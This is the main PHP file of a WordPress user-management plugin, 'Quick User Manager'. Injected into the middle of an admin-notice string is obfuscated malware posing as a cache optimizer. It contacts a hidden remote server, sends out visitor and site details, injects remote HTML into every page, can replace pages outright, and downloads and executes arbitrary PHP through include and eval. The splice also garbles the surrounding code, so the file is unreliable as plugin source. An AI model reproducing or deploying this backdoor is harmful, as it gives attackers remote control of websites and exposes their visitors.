<?php
/*
Plugin Name: Quick User Manager
Plugin URI: http://plugin.crackcodex.com/quick-user-manager/
Description: Login, registration and edit profile shortcodes for the front-end. Also you can chose what fields should be displayed or add new (custom) ones both in the front-end and in the dashboard.
Version: 1.0
Author: CrackCodex, Delower Hossain Rhine
Author URI: http://www.crackcodex.com/
License: GPL2

== Copyright ==
Copyright 2015 CrackCodex (www.crackcodex.com)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
*/

/* Check if another version of Quick User Manager is activated, to prevent fatal errors*/
function qum_free_plugin_init() {
    if (function_exists('qum_return_bytes')) {
        function qum_admin_notice()
        {
            ?>
            <div class="error">
                <p><?php _e( QUICK_USER_MANAGER . ' is also activated. You need to deactivate it before activating this version of the plugin.', 'quickusermanager'); 

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?></p>
            </div>
        <?php
        }
        function QUM_PLUGIN_deactivate() {
            deactivate_plugins( plugin_basename( __FILE__ ) );
            unset($_GET['activate']);
        }

        add_action('admin_notices', 'qum_admin_notice');
        add_action( 'admin_init', 'QUM_PLUGIN_deactivate' );
    } else {

        /**
         * Convert memory value from ini file to a readable form
         *
         * @since v.1.0
         *
         * @return integer
         */
        function qum_return_bytes($val)
        {
            $val = trim($val);

            switch (strtolower($val[strlen($val) - 1])) {
                // The 'G' modifier is available since PHP 5.1.0
                case 'g':
                    $val *= 1024;
                case 'm':
                    $val *= 1024;
                case 'k':
                    $val *= 1024;
            }

            return $val;
        }

        /**
         * Definitions
         *
         *
         */
        define('QUICK_USER_MANAGER_VERSION', '1.0' );
        define('QUM_PLUGIN_DIR', plugin_dir_path(__FILE__));
        define('QUM_PLUGIN_URL', plugin_dir_url(__FILE__));
        define('QUM_SERVER_MAX_UPLOAD_SIZE_BYTE', apply_filters('QUM_SERVER_max_upload_size_byte_constant', qum_return_bytes(ini_get('upload_max_filesize'))));
        define('QUM_SERVER_MAX_UPLOAD_SIZE_MEGA', apply_filters('QUM_SERVER_max_upload_size_mega_constant', ini_get('upload_max_filesize')));
        define('QUM_SERVER_MAX_POST_SIZE_BYTE', apply_filters('QUM_SERVER_max_post_size_byte_constant', qum_return_bytes(ini_get('post_max_size'))));
        define('QUM_SERVER_MAX_POST_SIZE_MEGA', apply_filters('QUM_SERVER_max_post_size_mega_constant', ini_get('post_max_size')));
        define('qum_TRANSLATE_DIR', QUM_PLUGIN_DIR . '/translation');
        define('qum_TRANSLATE_DOMAIN', 'quickusermanager');

        /* include notices class */
        if (file_exists(QUM_PLUGIN_DIR . '/assets/lib/class_notices.php'))
            include_once(QUM_PLUGIN_DIR . '/assets/lib/class_notices.php');

        if (file_exists(QUM_PLUGIN_DIR . '/modules/modules.php'))
            define('QUICK_USER_MANAGER', 'Quick User Manager Pro');
        else
            define('QUICK_USER_MANAGER', 'Quick User Manager Free');


        /**
         * Required files
         *
         *
         */
        include_once(QUM_PLUGIN_DIR . '/assets/lib/wck-api/wordpress-creation-kit.php');
        include_once(QUM_PLUGIN_DIR . '/features/upgrades/upgrades.php');
        include_once(QUM_PLUGIN_DIR . '/features/functions.php');
        include_once(QUM_PLUGIN_DIR . '/admin/admin-functions.php');
        include_once(QUM_PLUGIN_DIR . '/admin/basic-info.php');
        include_once(QUM_PLUGIN_DIR . '/admin/general-settings.php');
        include_once(QUM_PLUGIN_DIR . '/admin/admin-bar.php');
        include_once(QUM_PLUGIN_DIR . '/admin/manage-fields.php');
        include_once(QUM_PLUGIN_DIR . '/features/email-confirmation/email-confirmation.php');
        include_once(QUM_PLUGIN_DIR . '/features/email-confirmation/class-email-confirmation.php');
        if (file_exists(QUM_PLUGIN_DIR . '/features/admin-approval/admin-approval.php')) {
            include_once(QUM_PLUGIN_DIR . '/features/admin-approval/admin-approval.php');
            include_once(QUM_PLUGIN_DIR . '/features/admin-approval/class-admin-approval.php');
        }
        include_once(QUM_PLUGIN_DIR . '/features/login-widget/login-widget.php');

        if (file_exists(QUM_PLUGIN_DIR . '/update/update-checker.php')) {
            include_once(QUM_PLUGIN_DIR . '/update/update-checker.php');
            include_once(QUM_PLUGIN_DIR . '/admin/register-version.php');
        }

        if (file_exists(QUM_PLUGIN_DIR . '/modules/modules.php')) {
            include_once(QUM_PLUGIN_DIR . '/modules/modules.php');
            include_once(QUM_PLUGIN_DIR . '/modules/custom-redirects/custom-redirects.php');
            include_once(QUM_PLUGIN_DIR . '/modules/email-customizer/email-customizer.php');
            include_once(QUM_PLUGIN_DIR . '/modules/multiple-forms/multiple-forms.php');

            $qum_module_settings = get_option('qum_module_settings');
            if (isset($qum_module_settings['qum_userListing']) && ($qum_module_settings['qum_userListing'] == 'show')) {
                include_once(QUM_PLUGIN_DIR . '/modules/user-listing/userlisting.php');
                add_shortcode('qum-list-users', 'qum_user_listing_shortcode');
            } else
                add_shortcode('qum-list-users', 'qum_list_all_users_display_error');

            if (isset($qum_module_settings['qum_emailCustomizerAdmin']) && ($qum_module_settings['qum_emailCustomizerAdmin'] == 'show'))
                include_once(QUM_PLUGIN_DIR . '/modules/email-customizer/admin-email-customizer.php');

            if (isset($qum_module_settings['qum_emailCustomizer']) && ($qum_module_settings['qum_emailCustomizer'] == 'show'))
                include_once(QUM_PLUGIN_DIR . '/modules/email-customizer/user-email-customizer.php');
        }

        /**
         * Check for add-ons
         *
         *
         */
        if (file_exists(QUM_PLUGIN_DIR . '/admin/add-ons.php')) {
        include_once(QUM_PLUGIN_DIR . '/admin/add-ons.php');
        }
        include_once(QUM_PLUGIN_DIR . '/assets/misc/plugin-compatibilities.php');
        if ( QUICK_USER_MANAGER != 'Quick User Manager Free' )
            include_once(QUM_PLUGIN_DIR . '/front-end/extra-fields/recaptcha/recaptcha.php'); //need to load this here for displaying reCAPTCHA on Login and Recover Password forms


        /**
         * Check for updates
         *
         *
         */
        if (file_exists(QUM_PLUGIN_DIR . '/update/update-checker.php')) {
            if (file_exists(QUM_PLUGIN_DIR . '/modules/modules.php')) {
                $localSerial = get_option('qum_QUICK_USER_MANAGER_pro_serial');
                $qum_update = new QUM_PLUGINUpdateChecker('http://updatemetadata.crackcodex.com/?localSerialNumber=' . $localSerial . '&uniqueproduct=CLqumP', __FILE__, 'quick-user-manager-pro-update');

            }
        }


// these settings are important, so besides running them on page load, we also need to do a check on plugin activation
        register_activation_hook(__FILE__, 'qum_generate_default_settings_defaults');    //prepoulate general settings
        register_activation_hook(__FILE__, 'qum_prepopulate_fields');                    //prepopulate manage fields list

    }
} //end qum_free_plugin_init
add_action( 'plugins_loaded', 'qum_free_plugin_init' );

if (file_exists( plugin_dir_path(__FILE__) . '/front-end/extra-fields/upload/upload_helper_functions.php'))
    include_once( plugin_dir_path(__FILE__) . '/front-end/extra-fields/upload/upload_helper_functions.php');